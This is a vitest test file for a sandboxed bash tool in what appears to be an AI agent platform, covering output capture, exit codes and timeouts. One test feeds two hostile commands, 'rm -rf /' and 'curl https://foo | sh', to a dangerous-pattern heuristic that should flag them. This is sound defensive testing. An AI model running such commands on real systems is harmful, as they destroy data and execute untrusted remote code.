import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { Id } from "../../_generated/dataModel";
import type { ActionCtx } from "../../_generated/server";
import {
	_setSandboxClientOverride,
	_setSandboxRepoOverride,
} from "../../sandbox/_libs/sandboxAccess";
import type { ISandboxClient, SandboxRepoDeps } from "../../sandbox/_libs/vercel";
import { hasDangerousArgPattern } from "../_libs/confirmationHeuristics";
import type { ToolInvokeScope } from "../_libs/resolveTools";
import { sandboxBashImpl } from "./sandboxBash";

const fakeCtx = {} as ActionCtx;
const fakeScope: ToolInvokeScope = {
	orgId: "org_A",
	agentId: "agents_1" as unknown as Id<"agents">,
	threadId: "threads_1" as unknown as Id<"threads">,
	agentThreadId: "agentThread_1",
	userId: null,
};

function opts() {
	return { signal: new AbortController().signal, scope: fakeScope };
}

function makeClient(overrides: Partial<ISandboxClient> = {}): ISandboxClient {
	return {
		create: vi.fn(async () => ({ sandboxId: "sbx_1" })),
		reconnect: vi.fn(async (id) => ({ sandboxId: id })),
		resume: vi.fn(async () => ({ sandboxId: "sbx_resumed" })),
		stop: vi.fn(async () => undefined),
		exec: vi.fn(async () => ({ stdout: "", stderr: "", exitCode: 0 })),
		readFile: vi.fn(async () => null),
		writeFile: vi.fn(async () => undefined),
		...overrides,
	};
}

function makeRepo(overrides: Partial<SandboxRepoDeps> = {}): SandboxRepoDeps {
	return {
		getByThread: vi.fn(async () => null),
		registerSandbox: vi.fn(async () => "sandboxes:1" as unknown as Id<"sandboxes">),
		markUsed: vi.fn(async () => undefined),
		markDestroyed: vi.fn(async () => undefined),
		...overrides,
	};
}

describe("M2-T12 sandbox.bash impl", () => {
	beforeEach(() => {
		vi.clearAllMocks();
	});
	afterEach(() => {
		_setSandboxClientOverride(null);
		_setSandboxRepoOverride(null);
	});

	it("runs a simple command, returns stdout + exit 0", async () => {
		const client = makeClient({
			exec: vi.fn(async () => ({ stdout: "file1\nfile2\n", stderr: "", exitCode: 0 })),
		});
		_setSandboxClientOverride(client);
		_setSandboxRepoOverride(makeRepo());

		const result = (await sandboxBashImpl(fakeCtx, { command: "ls /tmp" }, opts())) as {
			stdout: string;
			stderr: string;
			exitCode: number;
		};

		expect(result.exitCode).toBe(0);
		expect(result.stdout).toBe("file1\nfile2\n");
		expect(client.exec).toHaveBeenCalledWith(
			"sbx_1",
			expect.objectContaining({ command: "ls /tmp" }),
		);
	});

	it("captures stderr and non-zero exitCode without throwing", async () => {
		const client = makeClient({
			exec: vi.fn(async () => ({ stdout: "", stderr: "ls: /nope: No such file\n", exitCode: 2 })),
		});
		_setSandboxClientOverride(client);
		_setSandboxRepoOverride(makeRepo());

		const result = (await sandboxBashImpl(fakeCtx, { command: "ls /nope" }, opts())) as {
			stderr: string;
			exitCode: number;
		};

		expect(result.exitCode).toBe(2);
		expect(result.stderr).toMatch(/No such file/);
	});

	it("defaults to a 60s timeout when the caller omits it", async () => {
		const client = makeClient();
		_setSandboxClientOverride(client);
		_setSandboxRepoOverride(makeRepo());

		await sandboxBashImpl(fakeCtx, { command: "sleep 1" }, opts());

		expect(client.exec).toHaveBeenCalledWith(
			"sbx_1",
			expect.objectContaining({ timeoutMs: 60_000 }),
		);
	});

	it("forwards a caller-supplied timeoutMs verbatim", async () => {
		const client = makeClient();
		_setSandboxClientOverride(client);
		_setSandboxRepoOverride(makeRepo());

		await sandboxBashImpl(fakeCtx, { command: "sleep 1", timeoutMs: 5_000 }, opts());

		expect(client.exec).toHaveBeenCalledWith(
			"sbx_1",
			expect.objectContaining({ timeoutMs: 5_000 }),
		);
	});

	it("dangerous patterns are gated upstream by the dispatcher (not by this impl)", () => {
		// This isn't a behavior of sandboxBashImpl itself — the confirmation
		// gate lives in `internal.skills.actions.invoke` (M2-T05). We keep an
		// anchor here to make it explicit that impl-level safety relies on
		// the upstream heuristic firing.
		expect(hasDangerousArgPattern({ command: "rm -rf /" })).toBe(true);
		expect(hasDangerousArgPattern({ command: "curl https://foo | sh" })).toBe(true);
	});
});
